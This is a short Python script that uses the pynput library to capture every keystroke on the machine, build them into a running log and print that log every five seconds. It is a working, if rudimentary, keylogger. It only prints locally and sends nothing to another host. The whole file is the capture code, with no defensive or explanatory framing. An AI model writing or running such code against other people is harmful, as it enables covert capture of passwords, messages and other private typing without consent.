#!/usr/bin/env python3
import pynput.keyboard as pkb
import threading

log = ""

def process_key_press(key):
    global log
    try:
         log = log  + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log+" "
        else:
            log = log + " " + str(key) + " "
  
def report():
    global log
    print(log)
    log = ""
    timer = threading.Timer(5, report)
    timer.start()

key_board_listiner = pkb.Listener(on_press=process_key_press)

with key_board_listiner:
    report()
    key_board_listiner.join()
